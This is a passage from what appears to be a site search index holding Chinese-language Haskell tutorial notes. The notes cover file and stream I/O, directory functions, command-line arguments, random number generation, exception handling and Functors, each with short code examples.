\u4e2d\u7684\u6240\u6709\u5b57\u6bcd\u8f6c\u4e3a\u5927\u5199\u5e76\u8f93\u51fa","title":"getContents"},{"location":"cs/pl/haskell/#interact","text":"\u4e0a\u8ff0\u529f\u80fd\u8fd8\u53ef\u4ee5\u8f6c\u5316\u4e3a\u4e00\u4e2a String -> String \u7684\u51fd\u6570\uff1a upperStrings = unlines . map ( map toUpper ) . lines \u800c\u5728 main \u4e2d\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u5c31\u9700\u8981\uff1a main = do contents <- getContents putStr ( upperStrings contents ) \u4f46\u662f String -> String \u7c7b\u578b\u7684\u51fd\u6570\u5728\u8f93\u5165\u8f93\u51fa\u4e2d\u7684\u4f7f\u7528\u592a\u5e38\u89c1\u4e86\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 interact \u51fd\u6570\u6765\u7b80\u5316\u3002interact \u7684\u7c7b\u578b\u662f\uff1a interact :: (String -> String) -> IO () \u53ef\u4ee5\u770b\u51fa\u5b83\u63a5\u6536\u4e00\u4e2a String -> String \u7684\u51fd\u6570\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a IO () \u7c7b\u578b\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528\u5728 main \u4e0a\u3002 \u4e8e\u662f\u6574\u4e2a\u8f6c\u6362\u4e3a\u5927\u5199\u7684\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u7b80\u5316\u4e3a\uff1a main = interact $ unlines . map ( map toUpper ) . lines","title":"interact"},{"location":"cs/pl/haskell/#_7","text":"\u4ee5\u4e0b\u4e0e\u6587\u4ef6\u548c\u6d41\u76f8\u5173\u7684\u51fd\u6570\u90fd\u5305\u542b\u5728 System.IO \u6a21\u5757\u4e2d","title":"\u6587\u4ef6\u548c\u6d41"},{"location":"cs/pl/haskell/#openfile","text":"openFile \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a openFile :: FilePath -> IOMode -> IO Handle \u5176\u4e2d FilePath \u662f String \u7684 type synonyms\uff0c\u7528\u4e00\u4e2a\u5b57\u7b26\u4e32\u6765\u8868\u793a\u9700\u8981\u6253\u5f00\u7684\u6587\u4ef6\u7684\u8def\u5f84 IOMode \u7684\u5b9a\u4e49\u662f\uff1a data IOMode = ReadMode | WriteMode | AppendMode | ReadWriteMode \u6240\u4ee5\u5b83\u4e00\u5171\u53ea\u6709\u56db\u4e2a\u503c\uff0c\u7528\u6765\u8868\u793a\u8fdb\u884c IO \u64cd\u4f5c\u7684\u6a21\u5f0f openFile \u8fd4\u56de\u4e00\u4e2a IO Handle \u7c7b\u578b\u7684\u503c\uff0c\u5c06\u5176\u7528 <- \u64cd\u4f5c\u7b26\u63d0\u53d6\u540e\u4f1a\u51fa\u73b0\u4e00\u4e2a Handle \u7684\u503c\u3002\u4f46\u4e0d\u80fd\u4ece Handle \u4e2d\u76f4\u63a5\u4f7f\u7528\u6587\u5b57\uff0c\u8fd8\u9700\u8981\u4f7f\u7528\u4e00\u7cfb\u5217\u51fd\u6570\uff1a hGetContents :: Handle -> IO String \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u5168\u90e8\u5185\u5bb9\uff0c\u8fd4\u56de\u4e00\u4e2a IO String hGetChar :: Handle -> IO Char \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26 hGetLine :: Handle -> IO String \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u4e00\u884c\uff0c\u8fd4\u56de\u4e00\u4e2a IO String hPutStr :: Handle -> String -> IO () \uff0c\u5411 Handle \u4e2d\u8f93\u51fa\u5b57\u7b26\u4e32 hPutStrLn :: Handle -> String -> IO () \uff0c\u540c\u4e0a \u5728\u4f7f\u7528 openFile \u8fdb\u884c\u6587\u4ef6\u64cd\u4f5c\u540e\uff0c\u9700\u8981\u4f7f\u7528 hClose \u624b\u52a8\u5173\u95ed Handle\u3002hClose :: Handle -> IO ()\uff0c\u63a5\u6536\u4e00\u4e2a Handle \u5e76\u8fd4\u56de IO ()\uff0c\u53ef\u4ee5\u76f4\u63a5\u653e\u5728 main \u51fd\u6570\u672b\u5c3e \u6240\u4ee5\u4f7f\u7528 openFile \u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u5168\u90e8\u5185\u5bb9\u5e76\u8f93\u51fa\u7684\u5168\u90e8\u4ee3\u7801\u662f\uff1a import System.IO main = do handle <- openFile \"text.txt\" ReadMode contents <- hGetContents handle putStrLn contents hClose handle","title":"openFile"},{"location":"cs/pl/haskell/#withfile","text":"withFile \u7c7b\u4f3c Python \u4e2d\u7684 with open\uff0c\u5b83\u5728\u8bfb\u53d6\u6587\u4ef6\u4f7f\u7528\u4e4b\u540e\u4e0d\u9700\u8981\u624b\u52a8 close \u6587\u4ef6\u3002\u5b83\u7684\u7c7b\u578b\u662f\uff1a withFile :: FilePath -> IOMode -> (Handle -> IO a) -> IO a \u53ef\u4ee5\u770b\u51fa\uff0c\u5b83\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\uff1a FilePath \uff1a\u4e00\u4e2a\u8868\u793a\u6587\u4ef6\u8def\u5f84\u7684String IOMode \uff1a\u6253\u5f00\u6587\u4ef6\u7684\u6a21\u5f0f (Handle -> IO a) \uff1a\u4e00\u4e2a\u51fd\u6570\uff0c\u8868\u793a\u5bf9\u8bfb\u53d6\u6587\u4ef6\u540e\u7684Handle\u7d22\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u8fd4\u56de\u4e00\u4e2aI/O action\uff1b\u800c\u8fd9\u4e2a\u8fd4\u56de\u503c\u4e5f\u5c06\u4f5c\u4e3awithFile\u7684\u8fd4\u56de\u503c \u73b0\u5728\u4f7f\u7528 withFile \u6765\u6539\u5199\u4e0a\u8ff0\u4ee3\u7801\uff1a import System.IO main = withFile \"text.txt\" ReadMode ( \\ handle -> do contents <- hGetContents handle putStrLn contents ) withFile \u7684\u529f\u80fd\u76f8\u5f53\u4e8e\u4ee5\u4e0b\u51fd\u6570\uff1a withFile' :: FilePath -> IOMode -> ( Handle -> IO a ) -> IO a withFile' path mode f = do handle <- openFile path mode result <- f handle hClose handle return result","title":"withFile"},{"location":"cs/pl/haskell/#readfile","text":"readFile \u53ef\u4ee5\u66f4\u52a0\u7b80\u5316\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u7684\u64cd\u4f5c\uff0c\u5b83\u7684\u7c7b\u578b\uff1a readFile :: FilePath -> IO String \u5b83\u53ea\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u8868\u793a\u6587\u4ef6\u8def\u5f84\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u5176\u4e2d\u4ee5\u5176\u4e2d\u5185\u5bb9\u4e3a\u5185\u5bb9\u7684 I/O action\uff1a import System.IO main = do contents <- readFile \"text.txt\" putStrLn contents","title":"readFile"},{"location":"cs/pl/haskell/#writefile","text":"writeFile \u7b80\u5316\u4e86\u5199\u5165\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u5b83\u7684\u7c7b\u578b\uff1a writeFile :: FilePath -> String -> IO () \u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u5199\u5165\u7684\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8981\u5199\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2aIO ()","title":"writeFile"},{"location":"cs/pl/haskell/#appendfile","text":"appendFile \u7c7b\u4f3c writeFile\uff0c\u4f46\u4f7f\u7528\u5b83\u4e0d\u4f1a\u8986\u76d6\u6587\u4ef6\u4e2d\u539f\u6765\u5185\u5bb9\uff0c\u800c\u662f\u76f4\u63a5\u628a\u5b57\u7b26\u4e32\u6dfb\u52a0\u5230\u6587\u4ef6\u672b\u5c3e","title":"appendFile"},{"location":"cs/pl/haskell/#buffer","text":"\u6587\u4ef6\u4ee5\u6d41\u7684\u5f62\u5f0f\u88ab\u8bfb\u53d6\uff0c\u9ed8\u8ba4\u6587\u5b57\u6587\u4ef6\u7684\u7f13\u51b2\u533a\uff08buffer\uff09\u5927\u5c0f\u662f\u4e00\u884c\uff0c\u5373\u6bcf\u6b21\u8bfb\u53d6\u4e00\u884c\u5185\u5bb9\uff1b\u9ed8\u8ba4\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4ee5\u5757\u4e3a\u5355\u4f4d\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u5219\u6839\u636e\u7cfb\u7edf\u9ed8\u8ba4\u6765\u9009\u62e9\u3002 \u4e5f\u53ef\u4ee5\u901a\u8fc7 hSetBuffering \u51fd\u6570\u6765\u624b\u52a8\u8bbe\u7f6e\u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u7c7b\u578b\uff1a hSetBuffering :: Handle -> BufferMode -> IO () \u5b83\u63a5\u6536\u4e00\u4e2a handle\uff0c\u548c\u4e00\u4e2a BufferMode\uff0c\u5e76\u8fd4\u56de IO ()\u3002\u5176\u4e2d BufferMode \u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a NoBuffering \uff1a\u6ca1\u6709\u7f13\u51b2\u533a\uff0c\u4e00\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26 LineBuffering \uff1a\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4e00\u884c\uff0c\u5373\u6bcf\u6b21\u8bfb\u5165\u4e00\u884c\u5185\u5bb9 BlockBuffering (Maybe Int) \uff1a\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4e00\u5757\uff0c\u5757\u7684\u5927\u5c0f\u7531 Maybe Int \u6307\u5b9a\uff1a BlockBuffering (Nothing) \uff1a\u4f7f\u7528\u7cfb\u7edf\u9ed8\u8ba4\u7684\u5757\u5927\u5c0f BlockBuffering (Just 2048) \uff1a\u4e00\u5757\u7684\u5927\u5c0f\u662f 2048 \u5b57\u8282\uff0c\u5373\u6bcf\u6b21\u8bfb\u5165 2048 bytes \u7684\u5185\u5bb9 \u7f13\u51b2\u533a\u7684\u5237\u65b0\u662f\u81ea\u52a8\u7684\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 hFlush \u6765\u624b\u52a8\u5237\u65b0 hFlush :: Handle -> IO () \u4f20\u5165\u4e00\u4e2a handle\uff0c\u8fd4\u56de IO ()\uff0c\u5373\u5237\u65b0\u5bf9\u5e94 handle \u7684\u7f13\u51b2\u533a","title":"buffer"},{"location":"cs/pl/haskell/#opentempfile","text":"openTempFile \u53ef\u4ee5\u65b0\u5efa\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6\uff1a openTempFile :: FilePath -> String -> IO (FilePath, Handle) FilePath \u6307\u4e34\u65f6\u6587\u4ef6\u8981\u521b\u5efa\u7684\u4f4d\u7f6e\u8def\u5f84\uff0c String \u6307\u4e34\u65f6\u6587\u4ef6\u540d\u5b57\u7684\u524d\u7f00\uff0c\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5176\u5185\u5bb9\u7b2c\u4e00\u4e2a FilePath \u662f\u521b\u5efa\u5f97\u5230\u7684\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84\uff0c Handle \u662f\u4e34\u65f6\u6587\u4ef6\u7684 handle \u4f8b\u5982\uff1a import System.IO main = do ( tempFile , tempHandle ) <- openTempFile \".\" \"temp\" ... hClose tempHandle \".\" \u6307\u4e34\u65f6\u6587\u4ef6\u8981\u5728\u5f53\u524d\u76ee\u5f55\u521b\u5efa\uff0c \"temp\" \u6307\u4e34\u65f6\u6587\u4ef6\u540d\u5b57\u4ee5 temp \u5f00\u5934\u3002\u6700\u7ec8\u5f97\u5230\u7684 tempFile \u5c31\u662f ./temp.......\uff0ctemp \u540e\u4e3a\u968f\u673a\u6570\u5b57\uff0c\u5982 ./temp43620-0","title":"openTempFile"},{"location":"cs/pl/haskell/#_8","text":"\u76f8\u5173\u51fd\u6570\u90fd\u5305\u542b\u5728 System.Directory \u6a21\u5757\u4e2d\uff0c\u5168\u90e8\u5185\u5bb9\u89c1 System.Directory","title":"\u8def\u5f84\u64cd\u4f5c"},{"location":"cs/pl/haskell/#getcurrentdirectory","text":"getCurrentDirectory :: IO FilePath \u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5176\u5185\u5bb9\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u8868\u793a\u5f53\u524d\u8def\u5f84\u7684\u7edd\u5bf9\u8def\u5f84","title":"getCurrentDirectory"},{"location":"cs/pl/haskell/#removefile","text":"removeFile :: FilePath -> IO () \u8f93\u5165\u4e00\u4e2a\u6587\u4ef6\u8def\u5f84\uff0c\u5e76\u5220\u9664\u6389\u5b83","title":"removeFile"},{"location":"cs/pl/haskell/#renamefile","text":"renameFile :: FilePath -> FilePath -> IO () \u8f93\u5165\u4e00\u4e2a\u539f\u8def\u5f84\uff0c\u4e00\u4e2a\u65b0\u8def\u5f84\uff0c\u4e3a\u539f\u8def\u5f84\u7684\u6587\u4ef6\u91cd\u547d\u540d\u4e3a\u65b0\u8def\u5f84\u7684\u540d","title":"renameFile"},{"location":"cs/pl/haskell/#doesfileexist","text":"doesFileExist :: FilePath -> IO Bool \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u5e03\u5c14\u503c\u7684 I/O action","title":"doesFileExist"},{"location":"cs/pl/haskell/#command-line-arguments","text":"System.Environment \u6a21\u5757\u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570\u53ef\u4ee5\u7528\u6765\u5904\u7406\u4f20\u5165\u547d\u4ee4\u884c\u7684\u53c2\u6570","title":"Command line arguments"},{"location":"cs/pl/haskell/#getargs","text":"getArgs :: IO [String] \u4e0d\u9700\u8981\u8f93\u5165\u53c2\u6570\uff0c\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5185\u5bb9\u4e3a\u4f20\u5165\u547d\u4ee4\u884c\u7684\u53c2\u6570\uff08\u4e00\u4e2a\u7531String\u7ec4\u6210\u7684\u5217\u8868\uff09\u3002\u76f8\u5f53\u4e8e C \u8bed\u8a00\u4e2d\u7684 argv[1:]","title":"getArgs"},{"location":"cs/pl/haskell/#getprogname","text":"getProgName :: IO String \u8fd4\u56de I/O action\uff0c\u5185\u5bb9\u4e3a\u7a0b\u5e8f\u7684\u540d\u5b57\uff0c\u76f8\u5f53\u4e8e C \u8bed\u8a00\u4e2d\u7684 argv[0]","title":"getProgName"},{"location":"cs/pl/haskell/#randomness","text":"\u548c\u968f\u673a\u6570\u6709\u5173\u7684\u51fd\u6570\u90fd\u5305\u542b\u5728 System.Random \u6a21\u5757\u4e2d\u3002GHCi \u542f\u52a8\u65f6\u53ef\u80fd\u4e0d\u4f1a\u5305\u542b System.Random \u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u65e0\u6cd5\u627e\u5230\u6a21\u5757\u3002\u9700\u8981\u901a\u8fc7 stack \u6253\u5f00: stack ghci --package random Haskell \u8981\u6c42\u540c\u6837\u7684\u7a0b\u5e8f\u9700\u8981\u8fd0\u884c\u51fa\u540c\u6837\u7684\u7ed3\u679c\uff0c\u9664\u4e86\u7528\u5230\u4e86 I/O action\uff0c\u6240\u6709\u4f1a\u9020\u6210\u4e0d\u540c\u7ed3\u679c\u7684\u51fd\u6570\u90fd\u8981\u4ea4\u7ed9 I/O action \u6765\u5b8c\u6210 \u90a3\u8981\u4f7f\u968f\u673a\u6570\u8131\u79bb IO \u5b58\u5728\uff0c\u5c31\u8981\u7528\u5230\u968f\u673a\u751f\u6210\u5668\uff08random generator\uff09 System.Random \u6a21\u5757\u63d0\u4f9b\u4e86\u51e0\u4e2a\u751f\u6210\u968f\u673a\u6570\u7684\u51fd\u6570\uff1a","title":"Randomness"},{"location":"cs/pl/haskell/#random","text":"random :: (Random a, RandomGen g) => g -> (a, g) \u5176\u4e2d\u53c8\u6709\u4e24\u4e2a\u65b0\u7684 typeclass\uff0cRandom \u8868\u793a\u53ef\u4ee5\u53d6\u968f\u673a\uff0cRandomGen \u8868\u793a\u968f\u673a\u6570\u751f\u6210\u5668\u3002random \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u751f\u6210\u7684\u968f\u673a\u6570\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u662f\u4e00\u4e2a\u65b0\u7684\u968f\u673a\u6570\u751f\u6210\u5668 \u83b7\u53d6\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u4ee5\u4f7f\u7528 mkStdGen \u51fd\u6570\uff1a mkStdGen :: Int -> StdGen \u5176\u4e2d StdGen \u662f\u4e00\u4e2a RandomGen \u7684\u5b9e\u4f8b \u8fd0\u7528 random \u751f\u6210\u968f\u673a\u6570\u9700\u8981\u6307\u5b9a\u7c7b\u578b\uff0c\u4e0d\u7136\u7a0b\u5e8f\u65e0\u6cd5\u786e\u5b9a a \u662f\u4ec0\u4e48\u7c7b\u578b\u3002\u4f8b\u5982\uff1a ghci > random ( mkStdGen 100 ) :: ( Int , StdGen ) ( 9216477508314497915 , StdGen { unStdGen = SMGen 712633246999323047 2532601429470541125 }) ghci > random ( mkStdGen 100 ) :: ( Char , StdGen ) ( '\\ 537310 ' ,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125}) ghci > random ( mkStdGen 100 ) :: ( Bool , StdGen ) ( True , StdGen { unStdGen = SMGen 712633246999323047 2532601429470541125 }) \u518d\u6b21\u8fd0\u884c\u540c\u6837\u7684\u51fd\u6570\uff0c\u4f1a\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002\u6240\u4ee5\u5982\u679c\u9700\u8981\u751f\u6210\u5176\u4ed6\u7684\u968f\u673a\u6570\uff0c\u9700\u8981\u66f4\u6362\u751f\u6210\u5668\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e0a\u4e00\u6b21\u8c03\u7528\u7ed3\u679c\u8fd4\u56de\u7684\u65b0\u968f\u673a\u6570\u751f\u6210\u5668\uff1a threeCoins :: StdGen -> ( Bool , Bool , Bool ) threeCoins gen = let ( firstCoin , newGen ) = random gen ( secondCoin , newGen' ) = random newGen ( thirdCoin , newGen'' ) = random newGen' in ( firstCoin , secondCoin , thirdCoin )","title":"random"},{"location":"cs/pl/haskell/#randoms","text":"randoms :: (Random a, RandomGen g) => g -> [a] randoms \u63a5\u6536\u4e00\u4e2a RandomGen\uff0c\u8fd4\u56de\u4e00\u4e2a\u968f\u673a\u7684\u65e0\u7a77\u5217\u8868\u3002\u56e0\u4e3a\u5b83\u662f\u65e0\u7a77\u7684\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8fd4\u56de\u65b0\u7684\u968f\u673a\u6570\u751f\u6210\u5668","title":"randoms"},{"location":"cs/pl/haskell/#randomr","text":"randomR :: (Random a, RandomGen g) => (a, a) -> g -> (a, g) \u53ef\u4ee5\u7528\u6765\u751f\u6210\u6709\u8303\u56f4\u7684\u968f\u673a\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5143\u7ec4\uff0c\u8868\u793a\u751f\u6210\u968f\u673a\u6570\u7684\u8303\u56f4(\u95ed\u533a\u95f4)","title":"randomR"},{"location":"cs/pl/haskell/#randomrs","text":"randomRs :: (Random a, RandomGen g) => (a, a) -> g -> [a] \u540c\u4e0a\u4e24\u4e2a\uff0c\u751f\u6210\u6709\u8303\u56f4\u7684\u65e0\u7a77\u968f\u673a\u6570\u5217\u8868","title":"randomRs"},{"location":"cs/pl/haskell/#getstdgen","text":"\u5982\u679c\u60f3\u8981\u8ba9\u7a0b\u5e8f\u6bcf\u6b21\u8fd0\u884c\u5f97\u5230\u4e0d\u540c\u7684\u968f\u673a\u7ed3\u679c\uff0c\u9700\u8981\u4f7f\u7528 getStdGen \u6765\u83b7\u53d6\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u5b83\u4f1a\u5728\u6bcf\u6b21\u8fd0\u884c\u7684\u65f6\u5019\u4ea7\u751f\u4e0d\u540c\u7684\u503c\uff0c\u4e5f\u56e0\u6b64\uff0c\u5b83\u8fd4\u56de\u7684\u662f\u4e00\u4e2a I/O action\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u76f4\u63a5\u7684 StdGen getStdGen :: Control.Monad.IO.Class.MonadIO m => m StdGen \u5373\u53ef\u4ee5\u770b\u6210 getStdGen :: IO StdGen\uff0c\u9700\u8981\u4f7f\u7528 <- \u64cd\u4f5c\u7b26\u5c06 StdGen \u63d0\u53d6\u51fa\u6765 \u4f46\u662f\u5728\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\uff0cgetStdGen \u7684\u7ed3\u679c\u662f\u76f8\u540c\u7684\uff0c\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\u4e0d\u4f1a\u81ea\u52a8\u66f4\u65b0\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u53e6\u4e00\u4e2a\u51fd\u6570 newStdGen","title":"getStdGen"},{"location":"cs/pl/haskell/#newstdgen","text":"newStdGen :: Control.Monad.IO.Class.MonadIO m => m StdGen \u6267\u884c newStdGen \u4f1a\u8fdb\u884c\u4e24\u4e2a\u64cd\u4f5c\uff1a \u66f4\u65b0\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u4e0b\u6b21\u6267\u884c getStdGen \u4f1a\u83b7\u5f97\u4e0d\u540c\u7684\u7ed3\u679c \u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5305\u542b\u4e00\u4e2a\u65b0\u7684 StdGen\uff08\u4f46\u662f\u8fd9\u4e2a\u751f\u6210\u5668\u548c\u5168\u5c40\u751f\u6210\u5668\u4e5f\u4e0d\u540c\uff09","title":"newStdGen"},{"location":"cs/pl/haskell/#exceptions","text":"\u7a0b\u5e8f\u5728\u8fd0\u884c\u5931\u8d25\u65f6\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u53ef\u4ee5\u901a\u8fc7 Control.Exception \u6a21\u5757\u4e2d\u7684 catch \u51fd\u6570\u6765\u6355\u83b7\u5f02\u5e38\uff1a catch :: Exception e => IO a -> (e -> IO a) -> IO a \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u4ee5 IO a \u4e3a\u8fd4\u56de\u503c\u7684\u7c7b\u578b\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u63a5\u6536\u5f02\u5e38\u5e76\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\uff1a import Control.Exception main = main' ` catch ` handler main' :: IO () main' = do ... handler :: Exception e => e -> IO () handler e = putStrLn \"...\" \u4e5f\u53ef\u4ee5\u5229\u7528\u5b88\u536b\uff08guard\uff09\u8bed\u6cd5\u548c System.IO.Error \u4e2d\u7684\u51fd\u6570\u6765\u5224\u65ad IO \u5f02\u5e38\u7684\u7c7b\u578b\u6765\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c\uff1a import System.Environment import System.IO.Error import Control.Exception main = toTry ` catch ` handler toTry :: IO () toTry = do ( fileName : _ ) <- getArgs contents <- readFile fileName putStrLn $ \"The file has \" ++ show ( length ( lines contents )) ++ \" lines!\" handler :: IOError -> IO () handler e | isDoesNotExistError e = putStrLn \"The file doesn't exist!\" | otherwise = ioError e \u5177\u4f53\u76f8\u5173\u5168\u90e8\u51fd\u6570\u89c1\u6587\u6863\uff1a System.IO.Error \u3001 Control.Exception","title":"Exceptions"},{"location":"cs/pl/haskell/#functors","text":"\u51fd\u5b50\uff08Functor\uff09\u662f\u4e00\u4e2a\u7c7b\u578b\u7c7b\uff08typeclass\uff09\uff0c\u548c\u5176\u4ed6\u7c7b\u578b\u7c7b\u4e00\u6837\uff0c\u5b83\u89c4\u5b9a\u4e86\u5176\u5b9e\u4f8b\u7c7b\u5fc5\u987b\u5b9e\u73b0\u7684\u529f\u80fd\uff08\u4f8b\u5982 Eq \u7c7b\u578b\u7c7b\u89c4\u5b9a\u4e86\u5b83\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u7684\uff09\uff0cFunctor \u89c4\u5b9a\u7c7b\u5b83\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u53ef\u4ee5\u8fdb\u884c\u6620\u5c04\u7684\u3002Functor \u8981\u6c42\u4f7f\u7528 fmap :: (a -> b) -> f a -> f b \u51fd\u6570\u6765\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a a -> b \u7c7b\u578b\u7684\u51fd\u6570\u3001\u4e00\u4e2a\u5185\u90e8\u5143\u7d20\u4e3a a \u7c7b\u578b\u7684\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u5185\u90e8\u5143\u7d20\u4e3a b \u7c7b\u578b\u7684\u51fd\u5b50 Functor \u53ef\u4ee5\u6bd4\u4f5c\u76d2\u5b50\uff0c\u90a3 fmap \u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\u7ed9\u5b9a\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u76d2\u5b50\uff0c\u5c06\u76d2\u5b50\u4e2d\u7684\u5168\u90e8\u5143\u7d20\u90fd\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u518d\u8fd4\u56de\u5e94\u7528\u51fd\u6570\u540e\u7684\u76d2\u5b50 \u51fd\u5b50\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u4e00\u4e2a Kind \u4e3a * -> * \u7684\u7c7b\u578b\u6784\u9020\u5668\uff0c\u56e0\u4e3a\u5b83\u8981\u6c42\u5176\u662f\u4e00\u4e2a\u76d2\u5b50\uff0c\u76d2\u5b50\u5728\u63a5\u6536\u5185\u5bb9\u540e\u624d\u4f1a\u6210\u4e3a\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\u3002fmap \u4e2d\u7684 f a \u548c f b \u4e5f\u662f\u56e0\u4e3a f \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5728\u63a5\u6536\u7c7b\u578b a/b \u540e\u624d\u4f1a\u53d8\u6210\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff08f a \u548c f b\uff09\u51fa\u73b0\u5728\u51fd\u6570\u7c7b\u578b\u58f0\u660e\u4e2d Functor \u7684\u5b9a\u4e49\u662f: class Functor f where fmap :: ( a -> b ) -> f a -> f b ( <$ ) :: a -> f a -> f b ( <$ ) = fmap . const \u53ef\u4ee5\u53d1\u73b0 Functor \u4e0d\u4ec5\u9700\u8981 fmap \u51fd\u6570\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a <$ \u51fd\u6570\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a a \u7c7b\u578b\u7684\u53d8\u91cf\u548c\u4e00\u4e2a\u5185\u5bb9\u4e3a b \u7c7b\u578b\u7684\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u5185\u5bb9\u4e3a a \u7c7b\u578b\u7684\u51fd\u5b50\uff1b\u4f5c\u7528\u5c31\u662f\u5c06\u4f20\u5165\u7684\u51fd\u5b50\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u66ff\u6362\u4e3a\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u6bd4\u5982\uff1a ghci > 'a' <$ [ 1 , 2 , 3 ] \"aaa\" \u4f46\u5b83\u4e0d\u662f\u58f0\u660e\u4e00\u4e2a\u51fd\u5b50\u5b9e\u4f8b\u5fc5\u987b\u7684\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u4f7f\u7528 fmap \u548c const \u51fd\u6570\u590d\u5408\u6765\u5b9e\u73b0\uff0c\u5176\u4e2d const \u7684\u7c7b\u578b\u7b7e\u540d\uff1a const :: a -> b -> a \u5373\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\uff0c\u4f46\u59cb\u7ec8\u53ea\u8fd4\u56de\u7b2c\u4e00\u4e2a\u53c2\u6570","title":"Functors"},{"location":"cs/pl/haskell/#functor","text":"","title":"Functor \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#_9","text":"\u5217\u8868 [] \u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u5b83\u901a\u8fc7 map \u51fd\u6570\u6765\u5b9e\u73b0 fmap \u7684\u529f\u80fd\uff1a instance Functor [] where fmap = map map :: (a -> b) -> [a] -> [b] map \u548c fmap \u8981\u6c42\u7684\u76f8\u540c\uff0c\u8fbe\u6210\u7684\u76ee\u7684\u4e5f\u4e00\u81f4\u3002map 